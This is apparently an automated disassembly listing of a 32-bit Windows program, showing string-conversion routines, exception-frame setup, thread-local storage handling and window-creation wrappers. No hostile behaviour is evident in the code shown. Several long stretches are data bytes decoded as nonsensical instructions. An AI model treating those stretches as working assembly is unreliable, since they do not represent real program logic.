sub_405a2c
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
call sub_401324
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_405a54
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax edx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor ecx ecx
test eax eax
je r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x8 ]
movzx edx [ eax + ecx * 2 ]
inc ecx
cmp edx 0x7f
jbe r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
inc esi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
cmp edx 0x7ff
jbe r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
inc esi
inc esi
mov [ eax + esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x4 ]
dec esi
mov edx [ ebp - 0x8 ]
movzx edx [ edx + ecx * 2 ]
inc ecx
cmp edx 0x7f
ja r-xdata
cmp edx 0x7ff
jbe r-xdata
mov [ eax + esi ] dl
inc esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
lea ebx [ esi + 0x3 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
mov ebx edx
shr ebx 0x6
or bl 0xc0
mov [ eax + esi ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x1 ] dl
add esi 0x2
mov ebx edx
shr ebx 0xc
or bl 0xe0
mov [ eax + esi ] bl
mov ebx edx
shr ebx 0x6
and bl 0x3f
or bl 0x80
mov [ eax + esi + 0x1 ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x2 ] dl
add esi 0x3
jmp r-xdata
sub_405b30
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0xffffffff
xor eax eax
xor esi esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
test dl 0x80
je r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
cmp esi [ ebp + 0x8 ]
jb r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
and dl 0x3f
test dl 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0xc ]
xor ecx ecx
mov cl [ edx + esi ]
inc esi
test cl 0x80
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] cx
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
and ecx 0x3f
test cl 0x20
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
and dl 0x3f
and edx 0xff
shl ecx 0x6
or dx cx
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
and dl 0x3f
and edx 0xff
shl ecx 0x6
or edx ecx
mov ecx edx
sub_405c68
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405d07
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4040ac
mov eax ebx
xor edx edx
call sub_404930
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405d0e
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
mov eax ebx
call sub_404924
lea edx [ eax + eax * 2 ]
lea eax [ ebp - 0x4 ]
call sub_4046f8
mov eax ebx
call sub_404924
push eax
mov eax [ ebp - 0x4 ]
call sub_40436c
inc eax
push eax
mov eax ebx
call sub_404914
push eax
mov eax [ ebp - 0x4 ]
call sub_40456c
pop ecx
pop edx
call sub_405a54
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_4040ac
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_4046f8
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404100
sub_405d14
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405dab
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4047b8
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405db2
lea eax [ ebp - 0x4 ]
call sub_4047b8
retn
mov eax ebx
call sub_40436c
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_404a00
mov eax ebx
call sub_40436c
push eax
mov eax [ ebp - 0x4 ]
call sub_404924
inc eax
push eax
mov eax ebx
call sub_40456c
push eax
mov eax [ ebp - 0x4 ]
call sub_404914
pop ecx
pop edx
call sub_405b30
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_4047b8
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_404a00
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4047f4
sub_405db8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405dfb
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404904
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_405c68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405e02
lea eax [ ebp - 0x4 ]
call sub_4047b8
retn
sub_405e08
push ebx
push esi
add esp 0xfffffc00
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x400
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_4042a4
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_405374
push eax
call sub_4012bc
mov ecx eax
mov edx esp
mov eax esi
call sub_40419c
jmp r-xdata
sub_405e60
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
xor edx edx
push ebp
push sub_405ec6
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0xb ]
push edx
push 0x1004
push eax
call sub_401284
lea eax [ ebp - 0x10 ]
lea edx [ ebp - 0xb ]
mov ecx 0x7
call sub_40431c
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x4 ]
call sub_402ce4
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405ecd
lea eax [ ebp - 0x10 ]
call sub_4040ac
retn
xor ebx ebx
sub_405ed4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405f1e
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405f25
retn
mov eax rw-data
call sub_402b5c
mov eax rw-data
call sub_402b5c
mov eax rw-data
call sub_402b5c
call sub_401af0
sub_405f28
sub [ rw-data ] 0x1
jae r-xdata
retn
mov [ rw-data ] 0x2
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] 0x2
mov [ rw-data ] sub_404e74
call sub_4030f0
test al al
je r-xdata
call sub_4031e4
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineA
mov [ rw-data ] eax
call sub_40133c
mov [ rw-data ] eax
call sub_401334
and eax 0x80000000
cmp eax 0x80000000
je r-xdata
call sub_403120
call sub_4012ac
call sub_405e60
mov [ rw-data ] eax
call sub_401334
and eax 0xff
cmp ax 0x4
jbe r-xdata
call sub_4012ac
call sub_405e60
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] 0x3
jmp r-xdata
call sub_40132c
mov [ rw-data ] eax
sub_406030
push ebx
call sub_406028
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_40601c
test eax eax
jne r-xdata
mov eax 0xe2
call sub_40401c
push eax
mov eax [ rw-data ]
push eax
call TlsSetValue
mov eax 0xe2
call sub_40401c
sub_406074
mov cl [ rw-data ]
mov eax [ rw-data ]
test cl cl
jne r-xdata
push eax
call TlsGetValue
test eax eax
je r-xdata
mov edx [ fs : 0x2c ]
mov eax [ edx + eax * 4 ]
retn
call sub_406030
mov eax [ rw-data ]
push eax
call TlsGetValue
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
retn
retn
sub_4060c0
push ebx
mov ebx eax
xor eax eax
mov [ rw-data ] eax
push 0x0
call sub_405ffc
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
call sub_4060b4
mov edx rw-data
mov eax ebx
call sub_403d70
pop ebx
retn
sub_406104
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406129
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406130
retn
sub_406178
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_406194
push ebx
mov ebx [ eax + 0x8 ]
mov ecx [ eax ]
sub ebx ecx
sar ebx 0x1
jns r-xdata
add ebx ecx
mov [ edx ] ebx
mov ebx [ eax + 0xc ]
mov ecx [ eax + 0x4 ]
sub ebx ecx
sar ebx 0x1
jns r-xdata
adc ebx 0x0
add ebx ecx
mov [ edx + 0x4 ] ebx
pop ebx
retn
adc ebx 0x0
sub_4061c0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4061e5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4061ec
retn
sub_4061f8
cld
popad
inc eax
add [ ebx ] al
add ch [ esi ]
xor [ 0x0 ] eax
or al 0x0
add [ eax ] al
clc
popad
inc eax
add [ edx ] cl
outsd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
or [ edi + 0x64 ] ch
inc edi
jb r-xdata
jb r-xdata
jns r-xdata
dec eax
xor [ fs : ebx ] ecx
outsd
push edx
jae r-xdata
or ch [ fs : edi + 0x64 ]
inc esp
imul esi [ ebx + 0x61 ] 0x64656c62
or [ edi + 0x64 ] ebp
inc ebx
push 0x656b6365
or [ fs : edi + 0x64 ] ebp
inc esi
outsd
arpl [ ebp + 0x73 ] si
or [ fs : edi + 0x64 ] ebp
inc esp
popa
jne r-xdata
dec eax
jb r-xdata
jb r-xdata
je r-xdata
dec eax
add [ ebx + 0x5c25ffc0 ] cl
dec eax
add [ ebx + 0x5825ffc0 ] cl
dec eax
sar bh 0x25
pushad
xor cl [ fs : esi ]
outsd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ ebx + 0x5425ffc0 ] cl
dec eax
add [ ebx + 0x5025ffc0 ] cl
dec eax
add [ ebx + 0x4c25ffc0 ] cl
dec eax
add [ ebx + 0x4825ffc0 ] cl
dec eax
add [ ebx + 0x4425ffc0 ] cl
dec eax
add [ ebx + 0x4025ffc0 ] cl
dec eax
add [ ebx + 0x3c25ffc0 ] cl
dec eax
add [ ebx + 0x3825ffc0 ] cl
dec eax
add [ ebx + 0x3425ffc0 ] cl
dec eax
add [ ebx + 0x3025ffc0 ] cl
dec eax
add [ ebx + 0x2c25ffc0 ] cl
dec eax
add [ ebx + 0x2825ffc0 ] cl
dec eax
add [ ebx + 0x2425ffc0 ] cl
dec eax
add [ ebx + 0x2025ffc0 ] cl
dec eax
add [ ebx + 0x1c25ffc0 ] cl
dec eax
add [ ebx + 0x1825ffc0 ] cl
dec eax
add [ ebx + 0x1425ffc0 ] cl
dec eax
add [ ebx + 0x1025ffc0 ] cl
dec eax
add [ ebx + 0xc25ffc0 ] cl
dec eax
add [ ebx + 0x825ffc0 ] cl
dec eax
add [ ebx + 0x425ffc0 ] cl
dec eax
add [ ebx + 0x25ffc0 ] cl
dec eax
add [ ebx - 0x3da0040 ] cl
dec eax
add [ ebx - 0x7da0040 ] cl
dec eax
add [ ebx - 0xbda0040 ] cl
dec eax
add [ ebx - 0xfda0040 ] cl
dec eax
add [ ebx - 0x13da0040 ] cl
dec eax
add [ ebx - 0x17da0040 ] cl
dec eax
add [ ebx - 0x1bda0040 ] cl
dec eax
add [ ebx - 0x1fda0040 ] cl
dec eax
add [ ebx - 0x23da0040 ] cl
dec eax
add [ ebx - 0x27da0040 ] cl
dec eax
add [ ebx - 0x2bda0040 ] cl
dec eax
add [ ebx - 0x2fda0040 ] cl
dec eax
add [ ebx - 0x33da0040 ] cl
dec eax
add [ ebx - 0x37da0040 ] cl
dec eax
add [ ebx - 0x3bda0040 ] cl
dec eax
add [ ebx - 0x3fda0040 ] cl
dec eax
add [ ebx - 0x43da0040 ] cl
dec eax
add [ ebx - 0x47da0040 ] cl
dec eax
add [ ebx - 0x4bda0040 ] cl
dec eax
add [ ebx - 0x4fda0040 ] cl
dec eax
add [ ebx - 0x53da0040 ] cl
dec eax
add [ ebx - 0x57da0040 ] cl
dec eax
add [ ebx - 0x5bda0040 ] cl
dec eax
add [ ebx - 0x5fda0040 ] cl
dec eax
add [ ebx - 0x63da0040 ] cl
dec eax
add [ ebx - 0x67da0040 ] cl
dec eax
add [ ebx - 0x6bda0040 ] cl
dec eax
add [ ebx - 0x6fda0040 ] cl
dec eax
add [ ebx - 0x73da0040 ] cl
dec eax
add [ ebx - 0x77da0040 ] cl
dec eax
add [ ebx - 0x7bda0040 ] cl
dec eax
add [ ebx - 0x7fda0040 ] cl
dec eax
add [ ebx + 0x7c25ffc0 ] cl
dec eax
add [ ebx + 0x7825ffc0 ] cl
dec eax
add [ ebx + 0x7425ffc0 ] cl
dec eax
add [ ebx + 0x7025ffc0 ] cl
dec eax
add [ ebx + 0x6c25ffc0 ] cl
dec eax
add [ ebx + 0x6825ffc0 ] cl
dec eax
add [ ebx + 0x6425ffc0 ] cl
dec eax
add [ ebx + 0x6025ffc0 ] cl
dec eax
add [ ebx + 0x5c25ffc0 ] cl
dec eax
add [ ebx + 0x5825ffc0 ] cl
dec eax
add [ ebx + 0x5425ffc0 ] cl
dec eax
add [ ebx + 0x5025ffc0 ] cl
dec eax
add [ ebx + 0x4c25ffc0 ] cl
dec eax
add [ ebx + 0x4825ffc0 ] cl
dec eax
add [ ebx + 0x4425ffc0 ] cl
dec eax
add [ ebx + 0x4025ffc0 ] cl
dec eax
add [ ebx - 0x7bda0040 ] cl
dec eax
add [ ebx - 0x7fda0040 ] cl
dec eax
add [ ebx + 0x7c25ffc0 ] cl
dec eax
add [ ebx + 0x6c25ffc0 ] cl
hlt
dec eax
ja EnterCriticalSection
or ch [ edi + 0x64 ]
outsd
dec eax
outsd
je r-xdata
add [ ebx + 0x6825ffc0 ] cl
add [ ebx + 0x7025ffc0 ] cl
dec eax
add [ ebx + 0x6c25ffc0 ] cl
dec eax
imul esi [ fs : edi + eax + 0x57 ] 0x6f646e69
je FileTimeToDosDateTime
ja r-xdata
imul esi [ edi + eax + 0x57 ] 0x6f646e69
dec ecx
outsb
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
or [ gs : edi + 0x64 ] ebp
dec esi
outsd
inc ecx
arpl [ ebx + 0x65 ] sp
insb
or eax 0x6f4e646f
inc esi
outsd
arpl [ ebp + 0x73 ] si
push edx
arpl [ gs : ebx + ecx + 0x6f ] si
push edx
jae CompareStringA
imul esp [ edi + 0x68 ] 0x646f0a74
mov eax eax
nop
lodsb [ esi ]
bound eax [ eax ]
push es
andps xmm1 [ edi + 0x77 ]
outsb
jb r-xdata
je r-xdata
add [ ebx + 0x6425ffc0 ] cl
dec eax
add [ ebx + 0x6025ffc0 ] cl
mov eax eax
add edi eax
popad
inc eax
add [ ebx + 0x3825ffc0 ] cl
dec eax
add [ ebx + 0x3425ffc0 ] cl
dec eax
add [ ebx + 0x3025ffc0 ] cl
dec eax
add [ ebx + 0x7425ffc0 ] cl
dec eax
sub_406d20
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402a90
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402a80
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x24
sub_406d78
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402a90
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
push 0x0
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402a80
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x20
sub_406dd0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowA
mov ebx eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageA
mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_406ec5
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_406eed
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406ef4
retn
sub_406f00
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406f25
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406f2c
retn
sub_406f38
out 0x48 al
add al dh
inc [ eax ]
add [ esi + 0x48 ] ah
add cl dh
inc [ eax ]
add [ esi + 0x48 ] ah
add dl dh
inc [ eax ]
add [ esi + 0x48 ] ah
add bl dh
inc [ eax ]
add [ esi + 0x48 ] ah
add ah dh
inc [ eax ]
add [ esi + 0x48 ] ah
add ch dh
inc [ eax ]
add [ esi + 0x48 ] ah
add dh dh
inc [ eax ]
add [ esi + 0x48 ] ah
add bh dh
inc [ eax ]
add [ esi + 0x48 ] ah
add al bh
inc [ eax ]
add [ esi + 0x48 ] ah
add cl bh
inc [ eax ]
add [ esi + 0x48 ] ah
add dl bh
inc [ eax ]
add [ esi + 0x48 ] ah
add bl bh
inc [ eax ]
add [ esi + 0x48 ] ah
add ah bh
inc [ eax ]
add [ esi + 0x48 ] ah
add ch bh
inc [ eax ]
add [ esi + 0x48 ] ah
add dh bh
inc [ eax ]
add [ esi + 0x48 ] ah
add bh bh
inc [ eax ]
add [ esi + 0x48 ] ah
add al ah
inc [ eax ]
add [ esi + 0x48 ] ah
add cl ah
inc [ eax ]
add [ esi + 0x48 ] ah
add dl ah
inc [ eax ]
add [ esi + 0x48 ] ah
add bl ah
inc [ eax ]
add [ esi + 0x48 ] ah
add ah ah
inc [ eax ]
add [ esi + 0x48 ] ah
add ch ah
inc [ eax ]
add [ esi + 0x48 ] ah
add dh ah
inc [ eax ]
add [ esi + 0x48 ] ah
add bh ah
inc [ eax ]
add [ esi + 0x48 ] ah
add al ch
inc [ eax ]
add [ esi + 0x48 ] ah
add cl ch
inc [ eax ]
add [ esi + 0x48 ] ah
add dl ch
inc [ eax ]
add [ esi + 0x48 ] ah
add bl ch
inc [ eax ]
add [ esi + 0x48 ] ah
add ah ch
inc [ eax ]
add [ esi + 0x48 ] ah
add ch ch
inc [ eax ]
add [ esi + 0x48 ] ah
add dh ch
inc [ eax ]
add [ esi + 0x48 ] ah
add bh ch
inc [ eax ]
add [ esi + 0x48 ] ah
add al dl
inc [ eax ]
add [ esi + 0x48 ] ah
add cl dl
inc [ eax ]
add [ esi + 0x48 ] ah
add dl dl
inc [ eax ]
add [ esi + 0x48 ] ah
add bl dl
inc [ eax ]
add [ esi + 0x48 ] ah
add ah dl
inc [ eax ]
add [ esi + 0x48 ] ah
add ch dl
inc [ eax ]
add [ esi + 0x48 ] ah
add dh dl
inc [ eax ]
add [ esi + 0x48 ] ah
add bh dl
inc [ eax ]
add [ esi + 0x48 ] ah
add al bl
inc [ eax ]
add [ esi + 0x48 ] ah
add cl bl
inc [ eax ]
add [ esi + 0x48 ] ah
add dl bl
inc [ eax ]
add [ esi + 0x48 ] ah
add bl bl
inc [ eax ]
add [ esi + 0x48 ] ah
add ah bl
inc [ eax ]
add [ esi + 0x48 ] ah
add ch bl
inc [ eax ]
add [ esi + 0x48 ] ah
add dh bl
inc [ eax ]
add [ esi + 0x48 ] ah
add bh bl
inc [ eax ]
add [ esi + 0x48 ] ah
add al al
inc [ eax ]
add [ esi + 0x48 ] ah
add cl al
inc [ eax ]
add [ esi + 0x48 ] ah
add dl al
inc [ eax ]
add [ esi + 0x48 ] ah
add bl al
inc [ eax ]
add [ esi + 0x48 ] ah
add ah al
inc [ eax ]
add [ esi + 0x48 ] ah
add ch al
inc [ eax ]
add [ esi + 0x48 ] ah
add dh al
inc [ eax ]
add [ esi + 0x48 ] ah
add bh al
inc [ eax ]
add [ esi + 0x48 ] ah
add al cl
inc [ eax ]
add [ esi + 0x48 ] ah
add cl cl
inc [ eax ]
add [ esi + 0x48 ] ah
add dl cl
inc [ eax ]
add [ esi + 0x48 ] ah
add bl cl
inc [ eax ]
add [ esi + 0x48 ] ah
add ah cl
inc [ eax ]
add [ esi + 0x48 ] ah
add ch cl
inc [ eax ]
add [ esi + 0x48 ] ah
add dh cl
inc [ eax ]
add [ esi + 0x48 ] ah
add bh cl
inc [ eax ]
add [ esi + 0x48 ] ah
add [ eax + 0x640000ff ] dh
out 0x48 al
add [ ecx + 0x640000ff ] dh
out 0x48 al
add [ edx + 0x640000ff ] dh
out 0x48 al
add [ ebx + 0x640000ff ] dh
out 0x48 al
add [ edi + edi * 8 - 0x199c0000 ] dh
dec eax
add [ ebp + 0x640000ff ] dh
out 0x48 al
add [ esi + 0x640000ff ] dh
out 0x48 al
add [ edi + 0x640000ff ] dh
out 0x48 al
add [ eax + 0x640000ff ] bh
out 0x48 al
add [ ecx + 0x640000ff ] bh
out 0x48 al
add [ edx + 0x640000ff ] bh
out 0x48 al
add [ ebx + 0x640000ff ] bh
out 0x48 al
add [ edi + edi * 8 - 0x199c0000 ] bh
dec eax
add [ ebp + 0x640000ff ] bh
out 0x48 al
add [ esi + 0x640000ff ] bh
out 0x48 al
add [ edi + 0x640000ff ] bh
out 0x48 al
add [ eax + 0x640000ff ] ah
out 0x48 al
add [ ecx + 0x640000ff ] ah
out 0x48 al
add [ edx + 0x640000ff ] ah
out 0x48 al
add [ ebx + 0x640000ff ] ah
out 0x48 al
add [ edi + edi * 8 - 0x199c0000 ] ah
dec eax
add [ ebp + 0x640000ff ] ah
out 0x48 al
add [ esi + 0x640000ff ] ah
out 0x48 al
add [ edi + 0x640000ff ] ah
out 0x48 al
add [ eax + 0x640000ff ] ch
out 0x48 al
add [ ecx + 0x640000ff ] ch
out 0x48 al
add [ edx + 0x640000ff ] ch
out 0x48 al
add [ ebx + 0x640000ff ] ch
out 0x48 al
add [ edi + edi * 8 - 0x199c0000 ] ch
dec eax
add [ ebp + 0x640000ff ] ch
out 0x48 al
add [ esi + 0x550000ff ] ch
mov ebp esp
xor eax eax
push ebp
push sub_407255
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40725c
retn
sub_407d78
pop ecx
jge r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x7d ] ah
inc eax
add [ ebp + 0x7d ] ch
inc eax
add [ ecx ] bh
jge r-xdata
je r-xdata
add [ eax ] dh
add [ eax ] al
add [ ecx + edx + 0x34e00040 ] ah
inc eax
add ah al
pop ecx
inc eax
add al dl
pop ecx
inc eax
add ah dh
xor al 0x40
add al ch
xor al 0x40
add al ah
pop ecx
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax ] bl
rol [ eax ] cl
and al 0x54
dec ebp
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jle r-xdata
add [ ecx + 0x7d ] al
inc eax
add [ ecx + 0x7d ] cl
inc eax
add [ ecx + 0x7d ] dl
inc eax
add [ ecx ] al
add [ eax ] al
add [ edx - 0x74 ] dl
adc [ ebx - 0x71 ] bh
sbb eax 0xdf9c4cdb
push edi
loopne r-xdata
mov eax eax
push ebx
pop edi
cmp eax 0xeae80000
mov ebx 0x5e5fffff
je r-xdata
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0x407d783f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x40 ] bh
add [ ebp + edi * 2 + 0x40 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x40 ] bh
dec [ ebx + 0x33c68bf0 ]
leave
arpl [ eax + 0x72 ] bp
outsd
pop ebx
retn
call sub_40bbd4
call sub_403a64
pop edi
pop esi
push edx
popad
inc ebp
js r-xdata
mov edx ebx
call sub_402cc4
mov eax esi
pop esi
pop ebx
retn
xor ecx ecx
outsb
imul edi [ edx + 0x65 ] r-xdata
insb
jne r-xdata
mov eax ebx
call sub_4026ec
mov esi eax
mov eax esi
jns r-xdata
imul esi [ esi + 0x65 ] 0x74697257
push ebx
sub_407e28
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_407e5c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbd4
call sub_403a64
pop edi
pop esi
pop ebx
retn
sub_407e80
push ebx
push esi
mov ebx eax
mov eax ebx
